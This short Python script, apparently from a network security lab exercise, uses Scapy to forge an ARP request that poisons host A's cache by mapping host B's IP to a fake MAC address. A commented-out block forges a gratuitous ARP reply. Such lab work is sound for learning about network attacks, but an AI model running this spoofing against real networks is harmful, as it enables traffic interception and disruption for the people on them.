### ARP command
# $ arp -n            // get current ARP cache for current host
# $ ip -s -s neigh flush all // clear up all cache in arp
from scapy.all import Ether, ARP, sendp, send

# A_IP = int('10.9.0.5', 16)
# A_IP = bytes('10.9.0.5')
A_IP = '10.9.0.5'
B_IP = '10.9.0.6'
M_IP = '10.9.0.1'
F_IP = '10.9.0.99'
A_MAC = "02:42:0a:09:00:05"
B_MAC = "02:42:0a:09:00:06"
M_MAC = "02:42:ce:21:94:af"
F_MAC = "aa:bb:cc:dd:ee:ff"
broadcast_MAC = "ff:ff:ff:ff:ff:ff"
target_IP = A_IP
target_MAC = A_MAC

# spoof arp packet
ether = Ether(dst=A_MAC, src=F_MAC)
arp = ARP(hwsrc=F_MAC, psrc=B_IP, pdst=A_IP)
arp.op = 1 # arp request
pkt = ether/arp
pkt.show()
sendp(pkt)

# # spoof gratuitous message
# ether = Ether(dst=broadcast_MAC, src=F_MAC)
# arp = ARP(hwsrc=F_MAC, psrc=F_IP, pdst=F_IP)
# arp.op = 2 # arp reply
# pkt = ether/arp
# pkt.show()
# send(pkt)
